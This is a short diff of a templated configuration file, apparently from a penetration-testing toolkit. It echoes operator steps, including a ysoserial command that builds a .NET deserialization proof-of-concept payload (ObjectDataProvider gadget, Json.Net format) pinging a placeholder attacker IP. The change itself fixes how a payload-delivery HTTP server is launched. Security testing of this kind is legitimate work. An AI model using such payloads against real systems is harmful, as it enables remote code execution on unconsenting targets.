@@ -18,4 +18,4 @@ content: |
   echo 'Expand Archive: Expand-Archive <%=$(esh variables/delivery_path_windows)%>\Release.zip -DestinationPath <%=$(esh variables/delivery_path_windows)%>\Release'; \
   echo 'Create PoC-Payload: <%=$(esh variables/delivery_path_windows)%>\Release\ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 <%=$(esh variables/attacker_ip)%>" -o base64'; \
   echo '================================================================'; \
-  python -m <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
